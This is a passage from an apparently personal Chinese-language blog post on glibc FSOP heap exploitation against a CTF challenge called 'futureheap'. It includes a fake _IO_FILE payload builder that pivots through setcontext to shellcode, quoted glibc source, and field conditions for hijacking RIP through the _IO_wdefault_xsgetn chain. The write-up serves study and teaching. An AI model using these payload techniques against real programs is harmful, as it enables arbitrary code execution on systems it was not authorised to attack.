<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> &#x3D; 地址<code>C</code>，用于劫持 <code>RIP</code>（即满足<code>*(B+0x68)=C</code>）</li>
</ul>
<p>但这里rdx进去不是可控地址，看上去是把我们处在第二个字段<code>_IO_read_ptr</code>的largebin chunk size给赋值过来了。这就为setcontext赋值增加了难度，所以这一题不用这个方法。我们能成功的到这一步其实已经算是成功的利用了这条链条。可以尝试call到别的地方打。</p>


<pre><code class="c">fake_IO_FILE  = p64(0x1000)   #read_end
fake_IO_FILE += p64(3)          #read_base
fake_IO_FILE += p64(20) + p64(22) #_write_base,_write_ptr
fake_IO_FILE += p64(0)+p64(0) #_IO_buf_base,_IO_buf_end 
fake_IO_FILE += p64(0)      #_IO_save_base
fake_IO_FILE += p64(0)      #_IO_backup_base
fake_IO_FILE += p64(0)      #_IO_save_end
fake_IO_FILE += p64(0)*4
fake_IO_FILE += p64(0)       #_lock
fake_IO_FILE = fake_IO_FILE.ljust(0x90, b&#39;\x00&#39;)
fake_IO_FILE += p64(fortune+0x18)    #_wide_data
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b&#39;\x00&#39;)
fake_IO_FILE += p64(0)            # _mode = 0
fake_IO_FILE += p64(fortune+0x108)       #setcontext-&gt;rsp
fake_IO_FILE += p64(fortune+0x108)     #setcontext-&gt;rcx
fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b&#39;\x00&#39;)
fake_IO_FILE += p64(_IO_wfile_jumps_mmap+0x8)  # vtable
fake_IO_FILE = fake_IO_FILE.ljust(0xf8,b&#39;\x00&#39;)
fake_IO_FILE += p64(fortune+0x100-0x68)
fake_IO_FILE = fake_IO_FILE.ljust(0x100,b&#39;\x00&#39;)
fake_IO_FILE += p64(setcontext+61) + shellcode
</code></pre>
<h5 id="3-IO-wdefault-xsgetn链"><a href="#3-IO-wdefault-xsgetn链" class="headerlink" title="3. _IO_wdefault_xsgetn链"></a>3. _IO_wdefault_xsgetn链</h5><p>源码：</p>
<pre><code class="c">#define _IO_in_put_mode(_fp) ((_fp)-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)

size_t
_IO_wdefault_xsgetn (FILE *fp, void *data, size_t n)
&#123;
  size_t more = n;
  wchar_t *s = (wchar_t*) data;
  for (;;)
    &#123;
      /* Data available. */
      ssize_t count = (fp-&gt;_wide_data-&gt;_IO_read_end
                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);
      if (count &gt; 0)
    &#123;
      if ((size_t) count &gt; more)
        count = more;
      if (count &gt; 20)
        &#123;
          s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);
          fp-&gt;_wide_data-&gt;_IO_read_ptr += count;
        &#125;
      else if (count &lt;= 0)
        count = 0;
      else
        &#123;
          wchar_t *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;
          int i = (int) count;
          while (--i &gt;= 0)
        *s++ = *p++;
          fp-&gt;_wide_data-&gt;_IO_read_ptr = p;
            &#125;
            more -= count;
    &#125;
    if (more == 0 || __wunderflow (fp) == WEOF)
        break;
    &#125;
  return n - more;
&#125;

wint_t
__wunderflow (FILE *fp)
&#123;
  if (fp-&gt;_mode &lt; 0 || (fp-&gt;_mode == 0 &amp;&amp; _IO_fwide (fp, 1) != 1))
    return WEOF;

  if (fp-&gt;_mode == 0)
    _IO_fwide (fp, 1);
  if (_IO_in_put_mode (fp))
    if (_IO_switch_to_wget_mode (fp) == EOF)
      return WEOF;
  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)
    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;
  if (_IO_in_backup (fp))
    &#123;
      _IO_switch_to_main_wget_area (fp);
      if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)
    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;
    &#125;
  if (_IO_have_markers (fp))
    &#123;
      if (save_for_wbackup (fp, fp-&gt;_wide_data-&gt;_IO_read_end))
    return WEOF;
    &#125;
  else if (_IO_have_backup (fp))
    _IO_free_wbackup_area (fp);
  return _IO_UNDERFLOW (fp);
&#125;

int
_IO_switch_to_wget_mode (FILE *fp)
&#123;
  if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)
    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)
      return EOF;
  if (_IO_in_backup (fp))
    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;
  else
    &#123;
      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;
      if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)
    fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;
    &#125;
  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;

  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr
    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;

  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;
  return 0;
&#125;
</code></pre>
<p>目的是进到<code>__wunderflow (fp)</code>中<code>_IO_switch_to_wget_mode</code>里的<code>(wint_t)_IO_WOVERFLOW (fp, WEOF)</code>这个虚表函数调用。</p>
<p>需要满足条件如下</p>
<pre><code class="c">fp-&gt;_wide_data-&gt;_IO_read_end == fp-&gt;_wide_data-&gt;_IO_read_ptr;	//可以绕过前面一些麻烦的操作，直奔__wunderflow
(fp-&gt;_mode &lt; 0 || (fp-&gt;_mode == 0 &amp;&amp; _IO_fwide (fp, 1) != 1)) == false;	//mode设置为1即可
_IO_in_put_mode (fp)!=0;	//即fp-&gt;flags &amp; 0x800 != 0
fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base;
</code></pre>
<p>构造如下</p>
<ul>
<li><code>_flags</code> &#x3D; <code>0x800</code></li>
<li><code>vtable</code> &#x3D; <code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code> 地址（加减偏移）</li>
<li><code>_mode</code> &gt; <code>0</code>（即满足<code>*(fp+0xc0)&gt;0</code>）</li>
<li><code>_wide_data</code> &#x3D; 可控堆地址<code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code> （即满足 <code>*(A+8)=*A</code>）</li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>（即满足<code>*(A+0x20)&gt;*(A+0x18)</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable</code> &#x3D; 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code> &#x3D; 地址<code>C</code>，用于劫持<code>RIP</code>（即满足<code>*(B+0x18)=C</code>）</li>
</ul>
<p>很可惜的是futureheap这道题只能申请0x700大小以下的堆块，而用largebin attack改的_IO_list_all后，第一个<code>_IO_FILE</code>结构体的<code>_flags</code>字段实质上就被赋值为largebin chunk的大小。我们就无法使<code>_IO_in_put_mode (fp)!=0</code>这个条件成立，所以本题也不好使用这一条链条。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>在示例题目中，上面3种方法只有第一种方式比较方便题解，这说明了几个链条的适用条件都有所不同，可以根据具体情况选择不同的链条进行尝试。本质还是<code>_IO_flush_all_lockp</code>这个FSOP的利用。</p>

    </div>
    
    
    
    
    
    
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 Collectcrop&#39;s Blog
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;collectcrop
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    




    
</body>
</html>
